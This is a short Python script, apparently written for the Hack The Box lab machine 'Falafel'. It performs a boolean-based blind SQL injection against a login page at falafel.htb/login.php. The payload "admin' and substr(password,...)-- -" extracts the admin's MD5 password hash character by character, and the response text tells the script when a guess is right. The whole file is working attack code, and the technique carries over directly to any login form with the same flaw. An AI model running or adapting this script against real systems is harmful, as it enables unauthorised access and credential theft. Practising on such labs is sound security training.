# Import Request HTTP Library - https://pypi.org/project/requests/
import requests

# Setting MD5 chars to check for
chars = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f']

# Define function called GetSQL with 2 parameters "i" and "c"
# Need to change username if others identified
def GetSQL(i,c):
    return "admin' and substr(password,%s,1) = '%s'-- -" % (i,c)

# Loop will require an approprite length for number of chars. In this example its 33 chars as a MD5 hash 128 bit made up of 32 character/hex format
for i in range(1,33):
    for c in chars:
        injection = GetSQL(i,c)
        payload = {'username':injection,'password':'d1zzyd1zzyd1zzy'}
        r = requests.post('http://falafel.htb/login.php', data = payload)
        if "Wrong identification" in r.text:
            print(c,end='', flush=True)
            break
print()
